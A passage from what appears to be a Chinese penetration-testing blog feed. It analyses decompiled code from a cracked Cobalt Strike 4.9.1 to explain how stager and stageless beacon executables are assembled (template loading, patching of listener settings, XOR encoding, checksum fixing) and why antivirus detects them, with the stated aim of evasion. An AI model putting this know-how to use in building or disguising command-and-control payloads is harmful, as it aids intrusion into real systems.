operator">=</span> var10<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var11<span class="token punctuation">,</span>var2<span class="token operator">+</span><span class="token string">"填充A.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode亦或后2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var13<span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var11<span class="token punctuation">)</span><span class="token punctuation">,</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//填充artifact64big.exe 的A</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var13<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode亦或后3.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var13<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var12<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"patchArtifact"</span><span class="token punctuation">,</span> var12<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>最终在代码dump下的截图<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241058846.png" alt="dumpbin"><br>同样我们把fixchesum.bin改成可执行文件就行了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241059790.png" alt="改成exe执行"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241100889.png" alt="生成的exe和我们dump的对比"><br>这个默认csprofile 配置的shellcode生成直接会被火绒查杀<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241100446.png" alt="默认配置直接杀"><br>我们来看stageless payload generator 生成器。发现我我们windows中分析的一样<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241101035.png" alt="语言生成"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241101487.png" alt="生成raw的shellcode"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241102045.png" alt="我们看到pre这个就是shellcode点"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>cs windows stageless可执行程序生成过程:<br/><br>(1)加载sleeve&#x2F;beacon.x64.dll 模版<br/><br>(2)把模板里面的Y patch sleepmask 从c2 profile读取到配置以后然后以开始AAAABBBBCCCCDDDDEEEEFFFF 装入配置<br/><br>(3)生成shellcode文件<br/><br>(4)把生成的shellcode通过异或以后 <br/><br>(5)把异或后的shellcode放到artifact64big.exe 里面<br/><br>(6)然后修复一下sum<br/><br>(7)直接生成exe文件<br/><br>通过上述你要是杀软你肯定标记artifact64big.exe 把这个特征标记死了。静态特征。<br>stageless也用这个这个肯定被标记过 了。beacon.x64.dll 也被标记了。另外shellcode也被标记了。我们需要修改profile文件配合进行免杀。这也就理解了为什么cs本质是玩beacon.dll和c2profile了。</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike 4.9.1-生成stage的exe文件为何落地被杀(二)</title>
      <link href="/penetrationtest/2025/01/articles/bec2e60042695dde/"/>
      <url>/penetrationtest/2025/01/articles/bec2e60042695dde/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前面我们分析了并且破解了cs 4.9.1。我日常渗透横向中用的比较多的cs为什么免杀如此难做。杀软到底在杀什么这篇文章我们以<br>cs生成可执行文件windows exe来讲解一下原因。为什么落地被杀到底是杀什么。看懂这篇文章需要有很深的java se编程基础。</p><h2 id="stage-shellcode生成分析"><a href="#stage-shellcode生成分析" class="headerlink" title="stage shellcode生成分析"></a>stage shellcode生成分析</h2><p>我们来到payloads 选择windows stager payload 如下图生成64位可执行文件。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231023653.png" alt="生成exe可执行文件"><br>选择一个监听器生成。创建监听器的过程我们忽略<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231024117.png" alt="生成界面"></p><p>我们来从代码分析生成流程<br>  src&#x2F;aggressor&#x2F;dialogs&#x2F;WindowsExecutableDialog.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">WindowsExecutableDialog</span><span class="token punctuation">(</span><span class="token class-name">AggressorClient</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stage对话框:"</span> <span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>client <span class="token operator">=</span> var1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>我们修改一下代码如下图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231025254.png" alt="生成关键代码截图"><br>我们看到   this.client &#x3D; var1;   我们来找var1初始化的函数 var1 &#x3D;  。来到了show函数<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231027466.png" alt="生成代码"><br>当我们在点击 generate的时候<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231028297.png" alt="点击生成按钮触发函数"><br>触发dialogAction函数。根据操作系统位数生成stage</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span>stager <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">getPayloadStager</span><span class="token punctuation">(</span>var3 <span class="token operator">?</span> <span class="token string">"x64"</span> <span class="token operator">:</span> <span class="token string">"x86"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//根据选择获取 stage  </span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231028881.png" alt="根据平台生成"><br>点击 getPayloadStager  函数跳转到 src&#x2F;common&#x2F;ScListener.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getPayloadStager</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token class-name">Stagers</span><span class="token punctuation">.</span><span class="token function">shellcode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>点击Stagers.shellcode   </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">shellcode</span><span class="token punctuation">(</span><span class="token class-name">ScListener</span> var0<span class="token punctuation">,</span> <span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//shellcode生成函数</span><span class="token class-name">GenericStager</span> var3 <span class="token operator">=</span> <span class="token class-name">A</span><span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>var0<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"生成shellcode调用的类名: "</span><span class="token operator">+</span>var3<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> var3 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> var3<span class="token punctuation">.</span><span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//实际调用子类为 GenericHTTPStager.java 根据监听器生成对应的shellcode</span><span class="token punctuation">&#125;</span></code></pre><p>我们看到A类初始化为 初始化的时候把listener也初始化了。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231030833.png" alt="初始化stage"><br>我们使用 var3.getClass().getName());  把子类打印出来    stagers.BeaconHTTPSStagerX64  因为我们使用的监听器是https<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231032971.png" alt="打印子类"><br>我们从反编译源码找BeaconHTTPSStagerX64  发现没有generate 函数。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231032413.png" alt="点击没有需要的函数"><br>根据java继承关系我们寻找父类 GenericHTTPSStagerX64 还没有我们继续<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231034202.png" alt="父类"><br>继续找 GenericHTTPStager<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231034796.png" alt="找到了"></p><p>我们复制一下  src&#x2F;stagers&#x2F;GenericHTTPStager.java 最终调用generate函数。注意代码里面的32-是随意标注的</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"加载shellcode: "</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getStagerFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">InputStream</span> var1 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">resource</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getStagerFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readAll</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//shellcode变成string 类型 编码是 ISO8859-1</span><span class="token comment">//System.out.println("加载shellcode原来的: "+var3);</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span><span class="token string">"32-shellcode.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将shellcode写入32-shellcode.bin</span>var1<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> var3 <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getStagerHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token char">'\u0000'</span><span class="token punctuation">;</span><span class="token class-name">Packer</span> var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Packer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">little</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AssertUtils<span class="token punctuation">.</span>TestPatchS</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token number">4444</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPortOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPortOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"32-shellcod1.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//System.exit(0);</span>var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Packer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">little</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token number">1453503984</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AssertUtils<span class="token punctuation">.</span>TestPatchI</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token number">1453503984</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExitOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getExitOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"32-shellcod2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Packer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">little</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">addShort</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getStagePreamble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AssertUtils<span class="token punctuation">.</span>TestPatchS</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token number">5555</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSkipOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSkipOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"32-shellcod3.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Packer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">little</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">addInt</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getConnectionFlags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AssertUtils<span class="token punctuation">.</span>TestPatchI</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isSSL</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">2069876224</span> <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">2074082816</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getFlagsOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getFlagsOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"32-shellcod4.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var5<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">isin</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token number">303</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var5 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">pad</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token char">'\u0000'</span><span class="token punctuation">,</span> <span class="token number">303</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> var3<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"32-shellcod5.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> var6 <span class="token operator">=</span> var3<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var5 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">pad</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token char">'\u0000'</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> var6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"32-shellcod6.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var3 <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWatermark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"HttpStagerGeneric: "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getStagerFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var7<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">replaceAt</span><span class="token punctuation">(</span><span class="token class-name">String</span> var0<span class="token punctuation">,</span> <span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token keyword">int</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call replaceAt!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//System.out.println("var0 "+var0);</span><span class="token class-name">StringBuffer</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>var3<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var2 <span class="token operator">+</span> var1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//System.out.println(var3);</span>var3<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> var3<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>从 resources&#x2F;httpsstager64.bin 加载shellcode 模版<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231036346.png" alt="shellcode模板"><br>shellcode模板特征<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231036562.png" alt="模板"><br>我们看到里面有需要xx和yy 我们再看代码。下面这段代码是分别找到x位置和y的位置从这里开始把listener 这些替换一下。组装shellcode<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231037284.png" alt="shellcode生成逻辑"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span>stager <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">getPayloadStager</span><span class="token punctuation">(</span>var3 <span class="token operator">?</span> <span class="token string">"x64"</span> <span class="token operator">:</span> <span class="token string">"x86"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//生成stage x86 